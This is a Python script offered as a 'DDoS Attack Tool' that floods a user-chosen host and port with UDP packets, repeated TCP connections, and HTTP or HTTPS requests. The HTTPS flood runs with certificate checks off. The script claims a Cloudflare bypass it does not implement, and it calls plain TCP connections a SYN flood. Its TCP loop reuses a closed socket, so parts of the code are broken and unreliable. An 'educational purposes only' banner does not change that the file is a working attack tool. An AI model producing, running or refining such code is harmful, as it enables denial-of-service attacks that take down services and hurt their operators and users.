#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import threading
import random
import requests
from concurrent.futures import ThreadPoolExecutor

# ---------- CONFIG ---------------------------------------------------------
# Max “requests per second” shown by the tool.  Feel free to change it.
MAX_RPS_LIMIT = 1e24
# ---------------------------------------------------------------------------

class BrokenCodeZDDoS:
    def __init__(self):
        self.host = ""
        self.port = 0
        self.target_url = ""
        self.stop_event = threading.Event()
        self.rps_counter = 0          # Number of packets/requests sent in the current second
        self.rps_lock = threading.Lock()

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        self.clear_screen()
        print("=" * 60)
        print("   DDoS Attack Tool v1.1")
        print("   Developed by BrokenCodeZ")
        print("=" * 60)
        print("\n[!] Educational Purposes Only!")
        print("[!] Use responsibly and legally.")
        print("=" * 60 + "\n")

    # ---------- USER INPUT --------------------------------------------------
    def get_input(self):
        self.host = input("Enter Hostname or IP: ").strip()
        if not self.host:
            print("Host cannot be empty!")
            return False

        try:
            self.port = int(input("Enter Port: ").strip())
        except ValueError:
            print("Port must be a number!")
            return False

        # Start a background thread that will print the RPS counter every second
        threading.Thread(target=self._rps_monitor, daemon=True).start()
        return True

    # ---------- RPS MONITOR -------------------------------------------------
    def _rps_monitor(self):
        while not self.stop_event.is_set():
            time.sleep(1)
            with self.rps_lock:
                rps = self.rps_counter
                self.rps_counter = 0
            print(f"\r[+] {rps} requests/packets sent in the last second (max limit: {MAX_RPS_LIMIT})", end='')

    # ---------- ATTACKS ----------------------------------------------------
    def udp_flood(self):
        print(f"\n[*] Starting UDP Flood against {self.host}:{self.port}")
        print("[*] Press Ctrl+C to stop.")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            while not self.stop_event.is_set():
                payload = os.urandom(random.randint(100, 1024))
                sock.sendto(payload, (self.host, self.port))
                with self.rps_lock:
                    self.rps_counter += 1
        except KeyboardInterrupt:
            print("\n[+] Attack stopped.")
        finally:
            sock.close()

    def tcp_flood(self):
        print(f"\n[*] Starting TCP SYN Flood against {self.host}:{self.port}")
        print("[*] Press Ctrl+C to stop.")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            while not self.stop_event.is_set():
                sock.connect((self.host, self.port))
                sock.send(b'\x00')
                sock.close()
                with self.rps_lock:
                    self.rps_counter += 1
        except KeyboardInterrupt:
            print("\n[+] Attack stopped.")

    def http_flood(self):
        self.target_url = f"http://{self.host}:{self.port}"
        print(f"\n[*] Starting HTTP Flood against {self.target_url}")
        print("[*] Simulating Cloudflare bypass via random User-Agents & Headers")
        print("[*] Press Ctrl+C to stop.")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
        }
        try:
            while not self.stop_event.is_set():
                requests.get(self.target_url, headers=headers, timeout=10)
                with self.rps_lock:
                    self.rps_counter += 1
        except KeyboardInterrupt:
            print("\n[+] Attack stopped.")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    def https_flood(self):
        self.target_url = f"https://{self.host}:{self.port}"
        print(f"\n[*] Starting HTTPS Flood against {self.target_url}")
        print("[*] Simulating Cloudflare bypass via TLS Handshake simulation")
        print("[*] Press Ctrl+C to stop.")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        try:
            while not self.stop_event.is_set():
                requests.get(self.target_url, headers=headers, timeout=10, verify=False)
                with self.rps_lock:
                    self.rps_counter += 1
        except KeyboardInterrupt:
            print("\n[+] Attack stopped.")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    # ---------- MAIN MENU ---------------------------------------------------
    def run_menu(self):
        while True:
            self.print_banner()
            print("Select Protocol:")
            print("1. UDP")
            print("2. TCP")
            print("3. HTTP")
            print("4. HTTPS")
            print("5. Other Network Options (Exit)")

            choice = input("\nEnter option number: ").strip()

            if choice == '1':
                if self.get_input():
                    t = threading.Thread(target=self.udp_flood)
                    t.start()

            elif choice == '2':
                if self.get_input():
                    t = threading.Thread(target=self.tcp_flood)
                    t.start()

            elif choice == '3':
                if self.get_input():
                    t = threading.Thread(target=self.http_flood)
                    t.start()

            elif choice == '4':
                if self.get_input():
                    t = threading.Thread(target=self.https_flood)
                    t.start()

            elif choice == '5':
                print("\nExiting BrokenCodeZ Tool...")
                self.stop_event.set()
                break

            else:
                print("Invalid option. Please try again.")


if __name__ == "__main__":
    tool = BrokenCodeZDDoS()
    tool.run_menu()